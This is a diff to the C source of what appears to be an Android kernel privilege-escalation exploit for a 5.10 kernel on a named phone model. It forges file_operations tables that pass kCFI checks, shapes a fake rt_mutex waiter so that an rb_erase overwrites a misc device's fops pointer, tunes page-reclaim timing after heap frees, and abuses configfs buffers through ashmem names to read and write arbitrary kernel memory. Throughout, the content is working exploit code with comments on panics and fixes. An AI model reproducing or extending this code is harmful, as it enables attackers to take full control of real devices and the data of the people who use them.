@@ -435,14 +435,25 @@ void put_fake_fops_table(unsigned char *p, size_t off) {
     put64(p, off + FOPS_OWNER_OFF, 0);
     put64(p, off + FOPS_LLSEEK_OFF,
           runtime_text_sym(a_ash_llseek, a_llseek));
+#ifdef GHOSTLOCK_KERNEL_5_10
+    /* 5.10: configfs bin fns are .read/.write style (see table note below). */
     put64(p, off + FOPS_READ_OFF,
           clone_cfg ? runtime_text_sym(a_cfg_r, CONFIGFS_READ_ITER_OFF) : 0);
     put64(p, off + FOPS_WRITE_OFF,
           clone_cfg ? runtime_text_sym(a_cfg_w, CONFIGFS_BIN_WRITE_ITER_OFF)
                     : 0);
-    put64(p, off + FOPS_READ_ITER_OFF,
-          a_ash_rditer ? runtime_text_sym(a_ash_rditer, 0) : 0);
+    put64(p, off + FOPS_READ_ITER_OFF, 0);
     put64(p, off + FOPS_WRITE_ITER_OFF, 0);
+#else
+    put64(p, off + FOPS_READ_OFF, 0);
+    put64(p, off + FOPS_WRITE_OFF, 0);
+    put64(p, off + FOPS_READ_ITER_OFF,
+          clone_cfg ? runtime_text_sym(a_cfg_r, CONFIGFS_READ_ITER_OFF)
+                    : (a_ash_rditer ? runtime_text_sym(a_ash_rditer, 0) : 0));
+    put64(p, off + FOPS_WRITE_ITER_OFF,
+          clone_cfg ? runtime_text_sym(a_cfg_w, CONFIGFS_BIN_WRITE_ITER_OFF)
+                    : 0);
+#endif
     put64(p, off + FOPS_IOCTL_OFF,
           runtime_text_sym(a_ioctl, ASHMEM_IOCTL_OFF));
     put64(p, off + FOPS_COMPAT_IOCTL_OFF,
@@ -453,16 +464,15 @@ void put_fake_fops_table(unsigned char *p, size_t off) {
           runtime_text_sym(a_open, ASHMEM_OPEN_OFF));
     put64(p, off + FOPS_RELEASE_OFF,
           runtime_text_sym(a_rel, ASHMEM_RELEASE_OFF));
-    pr_info("fops CLONE%s: llseek=%#llx read=%#llx write=%#llx "
-            "read_iter=%#llx ioctl=%#llx mmap=%#llx open=%#llx\n",
+    pr_info("fops CLONE%s: llseek=%#llx read_iter=%#llx write_iter=%#llx "
+            "ioctl=%#llx mmap=%#llx open=%#llx\n",
             clone_cfg ? "_CFG" : "_FOPS",
             (unsigned long long)runtime_text_sym(a_ash_llseek, a_llseek),
             (unsigned long long)(clone_cfg
-                ? runtime_text_sym(a_cfg_r, CONFIGFS_READ_ITER_OFF) : 0),
+                ? runtime_text_sym(a_cfg_r, CONFIGFS_READ_ITER_OFF)
+                : (a_ash_rditer ? runtime_text_sym(a_ash_rditer, 0) : 0ULL)),
             (unsigned long long)(clone_cfg
-                ? runtime_text_sym(a_cfg_w, CONFIGFS_BIN_WRITE_ITER_OFF) : 0),
-            a_ash_rditer ? (unsigned long long)runtime_text_sym(a_ash_rditer, 0)
-                         : 0ULL,
+                ? runtime_text_sym(a_cfg_w, CONFIGFS_BIN_WRITE_ITER_OFF) : 0ULL),
             (unsigned long long)runtime_text_sym(a_ioctl, ASHMEM_IOCTL_OFF),
             (unsigned long long)runtime_text_sym(a_mmap, ASHMEM_MMAP_OFF),
             (unsigned long long)runtime_text_sym(a_open, ASHMEM_OPEN_OFF));
@@ -505,23 +515,29 @@ void put_fake_fops_table(unsigned char *p, size_t off) {
     put64(p, off + FOPS_OWNER_OFF, 0);
     put64(p, off + FOPS_LLSEEK_OFF,
           runtime_text_sym(a_llseek, NOOP_LLSEEK_OFF));
-#ifdef GHOSTLOCK_KERNEL_5_10
-    put64(p, off + FOPS_READ_OFF,
-          runtime_text_sym(a_cfg_r, CONFIGFS_READ_ITER_OFF));
-#else
     put64(p, off + FOPS_READ_OFF, 0);
-#endif
   }
 #ifdef GHOSTLOCK_KERNEL_5_10
   /*
-   * 5.10: .write @ +0x18 (past rb leaf shell). configfs bin write CFI JT.
+   * 5.10 configfs bin ops are .read/.write style (never converted to
+   * _iter — verified against the real configfs_bin_file_operations in
+   * the CPH2521 Image: read=configfs_read_bin_file.cfi_jt @+0x10,
+   * write=configfs_write_bin_file.cfi_jt @+0x18, all other slots 0).
+   * Putting them in the iter slots trips kCFI: the write_iter call site
+   * type-checks (kiocb*, iov_iter*) but the targets carry
+   * (file*, buf*, count*, pos*) — QEMU-verified panic
+   * "CFI failure (target: configfs_write_bin_file.cfi_jt)".
    */
+  if (!rb_leaf) {
+    /* rb-leaf shell keeps +0x10 = 0 (left child NULL) — never plant a JT
+     * there for shell modes; the shell spans [0x00, 0x18). */
+    put64(p, off + FOPS_READ_OFF,
+          runtime_text_sym(a_cfg_r, CONFIGFS_READ_ITER_OFF));
+  }
   put64(p, off + FOPS_WRITE_OFF,
         runtime_text_sym(a_cfg_w, CONFIGFS_BIN_WRITE_ITER_OFF));
-  if (!rb_leaf) {
-    put64(p, off + FOPS_READ_ITER_OFF, 0);
-    put64(p, off + FOPS_WRITE_ITER_OFF, 0);
-  }
+  put64(p, off + FOPS_READ_ITER_OFF, 0);
+  put64(p, off + FOPS_WRITE_ITER_OFF, 0);
 #else
   put64(p, off + FOPS_WRITE_OFF, 0);
   put64(p, off + FOPS_READ_ITER_OFF,
@@ -962,12 +978,33 @@ int prepare_skb_payload(uintptr_t base, int payload_mode) {
       write_left = 0;
       pr_info("mode4 TWO-NODE SAFE W0.pi→W1@%016zx (experiment/softboot)\n",
               w1_node);
+    } else if (env_flag("MODE4_JOINCHANG", 0)) {
+      /*
+       * JoinChang mode-4 geometry, compacted to the TRUE 5.10 waiter
+       * offsets (pi_tree@0x18 via -DFAKE_WAITER_PI_TREE_ENTRY_OFF):
+       *   W0.pi: parent_color=fake_fops (RED, no rebalance), right=MISC_P0,
+       *          left=0
+       *   fake_task.pi_waiters root=leftmost=&W0.pi (armed below)
+       * When the walk's rt_mutex_dequeue_pi(fake_task, W0) runs
+       * rb_erase(&W0.pi), the right-child-only path does
+       *   child->__rb_parent_color = pc  →  *MISC_FOPS = fake_fops
+       * with no rebalance (red) and a no-op __rb_change_child (parent
+       * slots don't match the node). Stale 2026-08-02 "DIG softboots"
+       * verdict was measured on the broken 920B-gap word layout — this
+       * must be re-tested under compact.
+       */
+      write_pc = fake_fops;
+      write_right = misc_p0;
+      write_left = 0;
+      pr_info("mode4 JOINCHANG W0.pi parent=fake_fops=%016zx right=MISC_P0="
+              "%016zx left=0 (+pi_waiters armed)\n",
+              write_pc, write_right);
     } else {
       /*
        * DEFAULT = t0_last proven packing (DIG no-gadget survive → cfi errno 22):
        *   heap W0 main=1,0,0  pi=1,0,0  task=init_task  lock=fake_lock
        *   pi_waiters=0  stack clean  shift=-2
-       * Write shapes (DIG/classic/two-node) are env-only — they softboot.
+       * Write shapes (JOINCHANG/DIG/classic/two-node) are env-only.
        */
       write_pc = 1;
       write_right = 0;
@@ -1221,7 +1258,8 @@ int prepare_skb_payload(uintptr_t base, int payload_mode) {
       char *ng = getenv("MODE4_NO_GADGET");
       char *pi_off = getenv("MODE4_PI_WAITERS");
       int want_pi = 0;
-      if (pi_off && pi_off[0] == '1')
+      if ((pi_off && pi_off[0] == '1') ||
+          env_flag("MODE4_JOINCHANG", 0))
         want_pi = 1;
       (void)ng;
       if (want_pi) {
@@ -1464,6 +1502,20 @@ uintptr_t prepare_kernel_page(int payload_mode) {
   sched_yield();
   SYSCHK(close(memfd_leak));
   memfd_leak = -1;
+  /*
+   * RECLAIM_DELAY_MS: mm_struct frees are RCU/mmdrop-deferred; if the
+   * reclaim sends fire before the target page reaches the PCP freelist,
+   * the frag grabs an unrelated page (QEMU TCG is especially slow at
+   * quiescing). Small delay lets the frees land while the (idle) freelist
+   * head still holds our page.
+   */
+  {
+    int rdelay = env_int_range("RECLAIM_DELAY_MS", 0, 0, 2000);
+    if (rdelay > 0) {
+      usleep((useconds_t)rdelay * 1000);
+      sched_yield();
+    }
+  }
   for (int i = 0; i < reclaim_sends; i++) {
     errno = 0;
     ssize_t sent = sendmsg(reclaim_sv[0], &rmsg, MSG_DONTWAIT);
@@ -1533,10 +1585,29 @@ ssize_t configfs_write_once(int fd, uintptr_t target, const void *data, size_t l
 ssize_t configfs_read_once(int fd, uintptr_t target, void *data, size_t len) {
   unsigned char blob[128];
   memset(blob, 0, sizeof(blob));
+#ifdef GHOSTLOCK_KERNEL_5_10
+  /*
+   * 5.10 configfs_read_bin_file copies from buffer->bin_buffer via
+   * simple_read_from_buffer-style bounds: *ppos (32-bit-compared against
+   * bin_buffer_size at +0x60) must be < size. JoinChang's huge
+   * ASHMEM_PREFIX_COUNT-derived pos (6.12 read_iter style) overflows that
+   * check here. Use a small pos and size = pos+len; bin_buffer = target-pos
+   * so bin_buffer+pos lands on target.
+   */
+  off_t pos = 0x1000;
+  if ((size_t)pos < len) pos = (off_t)len + 0x100;
+  put64(blob, CFG_BIN_BUFFER_OFF - ASHMEM_NAME_PREFIX_LEN,
+        target - (uintptr_t)pos);
+  put32(blob, CFG_BIN_BUFFER_SIZE_OFF - ASHMEM_NAME_PREFIX_LEN,
+        (uint32_t)pos + (uint32_t)len);
+  put32(blob, CFG_NEEDS_READ_FILL_OFF - ASHMEM_NAME_PREFIX_LEN, 0);
+  put32(blob, CFG_CB_MAX_SIZE_OFF - ASHMEM_NAME_PREFIX_LEN, 0);
+#else
   off_t pos = (off_t)(ASHMEM_PREFIX_COUNT - len);
   uintptr_t page = target - (uintptr_t)pos;
   put64(blob, CFG_PAGE_OFF - ASHMEM_NAME_PREFIX_LEN, page);
   put32(blob, CFG_NEEDS_READ_FILL_OFF - ASHMEM_NAME_PREFIX_LEN, 0);
+#endif
   errno = 0;
   int set_ret = try_set_ashmem_name_blob(fd, blob, sizeof(blob));
   int set_errno = errno;
